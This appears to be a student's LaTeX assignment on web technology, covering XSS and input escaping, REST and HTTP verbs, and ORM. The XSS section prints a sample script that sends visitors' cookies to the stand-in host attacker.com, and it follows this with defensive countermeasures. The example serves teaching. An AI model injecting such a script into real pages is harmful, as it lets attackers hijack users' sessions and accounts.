@@ -1,0 +1,131 @@
+\documentclass{article}
+
+\begin{document}
+\title{WEB-TECNOLOGY ASSINGMENT (1)}
+\author{JOHN BWALE}
+\date{TODAY}
+\maketitle
+
+\textbf{USER INPUT HANDLING AND ESCAPING}
+
+(a) Explain the concepts of input escaping and cross-site scripting (XSS) attacks.
+
+Answer:
+
+Input escaping is a technique used to sanitize and encode user input before displaying it in web pages or processing it in web applications. The purpose of input escaping is to prevent the execution of malicious code embedded in user input, ensuring that the input is treated as data rather than executable code. By escaping characters with special meaning in the target output context (such as HTML, JavaScript, or SQL), the input is rendered harmless and displayed as intended.
+
+Cross-Site Scripting (XSS) attacks occur when an attacker injects malicious scripts into a web application, which are then executed by unsuspecting users viewing the affected page. This attack is possible when user input is not properly sanitized or validated before being displayed. The attacker can exploit vulnerabilities in the application to inject scripts that steal sensitive information, manipulate user interactions, or deface the website.
+
+(b) Provide a detailed example of how an attacker might exploit a web application by injecting malicious scripts through user input.
+
+Answer:
+
+Let's say there is a social media website that allows users to post comments on other users' profiles. The website fails to properly sanitize and validate user input before displaying it. An attacker takes advantage of this vulnerability by injecting a malicious script into a comment.
+
+For example, the attacker submits a comment containing the following script:
+
+\begin{verbatim}
+<script>
+  // Malicious script to steal user cookies
+  document.location = 'http://attacker.com/steal.php?cookie=' + document.cookie;
+</script>
+\end{verbatim}
+
+When other users view the targeted profile page, the script is executed in their browsers. It redirects them to the attacker's website, passing their cookies as a parameter. The attacker can then capture the cookies and use them to impersonate the victims, access their accounts, or perform other malicious activities.
+
+(c) Describe the countermeasures developers can implement to prevent XSS attacks.
+
+Answer:
+
+To prevent XSS attacks, developers can implement the following countermeasures:
+
+1. Input Validation and Sanitization: Validate and sanitize all user input on the server-side. Remove or escape any characters with special meaning in the target output context (e.g., HTML, JavaScript). Use appropriate validation libraries or frameworks to ensure input integrity.
+
+2. Output Encoding: Before displaying user input, encode it using the appropriate encoding method for the output context (e.g., HTML entity encoding, JavaScript encoding). This ensures that user-generated content is treated as data rather than executable code.
+
+3. Content Security Policy (CSP): Implement a strict Content Security Policy that specifies which sources are allowed to be executed on a web page. This helps prevent the execution of any unauthorized scripts.
+
+4. Context-Specific Output Handling: Be mindful of the output context (e.g., HTML, JavaScript) and ensure that user input is treated as data and not code. Use context-specific escaping libraries or functions provided by your programming language or framework.
+
+5. Regular Security Updates: Keep your web application and its dependencies up to date with the latest security patches. This helps protect against known vulnerabilities that can be exploited by attackers.
+
+By implementing these countermeasures, developers can significantly reduce the risk of XSS attacks and protect user data.
+
+\section*{Introduction to RESTful APIs}
+
+\subsection*{Assignment (2) - Key Concepts of REST and HTTP Verbs}
+
+(a) Define the core principles of Representational State Transfer (REST) architecture.
+
+Answer:
+
+The core principles of Representational State Transfer (REST) architecture are as follows:
+
+1. Stateless Communication: Each client request to the server must contain all the necessary information to understand and process the request. The server doesn't maintain any client state between requests. State information, if required, is sent by the client with each request.
+
+2. Resource-Oriented: REST treats resources as the key concept in the system. Resources are identified by unique URIs (Uniform Resource Identifiers), and clients interact with these resources using standard HTTP methods (GET, POST, PUT, DELETE).
+
+3. Uniform Interface: RESTful APIs provide a uniform interface for accessing and manipulating resources. This interface is typically based on standard HTTP methods and supports various data formats such as JSON or XML for data exchange. It should be self-descriptive, meaning the API should include enough information in the response to allow clients to understand how to interact with the resource.
+
+4. Layered Architecture: REST allows for a layered architecture, where intermediaries such as proxies or caches can be added between clients and servers to improve scalability, performance, and security. Each layer in the architecture can be modified independently without affecting the overall system.
+
+(b) Explain the significance of HTTP verbs (GET, POST, PUT, DELETE) in building RESTful APIs. Provide real-world scenarios for when each HTTP verb should be used.
+
+Answer:
+
+HTTP verbs (GET, POST, PUT, DELETE) play a significant role in building RESTful APIs. They define the actions that clients can perform on resources. Here are some real-world scenarios for each HTTP verb:
+
+- GET: This verb is used to retrieve a representation of a resource or a collection of resources. For example, when a user requests the details of a specific product from an e-commerce website, a GET request is sent to the server.
+
+- POST: This verb is used to submit data to be processed by the server. It is often used when creating new resources. For example, when a user submits a form to create a new blog post, a POST request is sent to the server with the form data.
+
+- PUT: This verb is used to update an existing resource. It replaces the entire resource with the new representation provided in the request. For example, when a user edits the details of their profile on a social media platform, a PUT request is sent to update the user's information.
+
+- DELETE: This verb is used to delete a resource. It instructs the server to remove the specified resource. For example, when a user wants to delete a post they made on a forum, a DELETE request is sent to the server.
+
+\section*{Introduction to Object-Relational Mapping (ORM)}
+
+\subsection*{Assignment (3) - Benefits of ORM in Database Operations}
+
+(a) Explain the concept of Object-Relational Mapping (ORM) and its benefits in simplifying database interactions. Compare traditional SQL queries with ORM-based approaches.
+
+Answer:
+
+Object-Relational Mapping (ORM) is a technique that allows developers to interact with a relational database using object-oriented programming languages. ORM frameworks map database tables to classes and database rows to objects, providing an abstraction layer between the application code and the database.
+
+Benefits of ORM in simplifying database interactions include:
+
+- Reduced Boilerplate Code: ORM eliminates the need for writing repetitive and error-prone SQL queries manually. Developers can perform database operations using higher-level APIs and object-oriented constructs, reducing the amount of code they need to write.
+
+- Improved Productivity: ORM simplifies database-related tasks, allowing developers to focus more on application logic. They can work with familiar programming paradigms and utilize features like inheritance, encapsulation, and polymorphism when interacting with the database.
+
+- Database Independence: ORM frameworks provide a level of abstraction that allows applications to work with different database systems without significant code changes. Developers can write ORM-based code that is agnostic to the underlying database, making it easier to switch databases or support multiple database systems.
+
+- Automated Mapping: ORM frameworks handle the mapping between database tables and object classes automatically. They generate SQL queries based on object operations, such as saving an object or retrieving related objects. This automated mapping reduces the manual effort required for data mapping and reduces the chance of errors.
+
+- Easier Maintenance: With ORM, making changes to the database schema or data model becomes easier. Developers can update the object model and let the ORM framework handle the necessary database schema changes. This simplifies the maintenance process and reduces the risk of introducing inconsistencies.
+
+(b) Provide an example demonstrating how ORM reduces the need for manual data mapping.
+
+Answer:
+
+Consider a scenario where you have a "User" table in your database with columns for "id," "name," and "email." In traditionalSQL, you would need to write explicit queries to retrieve data from the database and manually map the results to objects in your application code.
+
+With ORM, you can define a "User" class in your application code, and the ORM framework will handle the mapping between the database table and the object automatically. Here's an example using a hypothetical ORM framework:
+
+\begin{verbatim}
+class User {
+  int id;
+  string name;
+  string email;
+}
+
+// Retrieving a user from the database
+User user = ORM.findOne(User.class, "id = 1");
+\end{verbatim}
+
+In this example, the ORM framework generates the necessary SQL query to retrieve a user with the specified ID from the "User" table. It then maps the retrieved data to the "User" object, eliminating the need for manual data mapping.
+
+By using ORM, you can focus on working with object-oriented constructs and manipulate data using familiar programming paradigms, rather than dealing with low-level SQL queries and manual data mapping.
+
+\end{document}
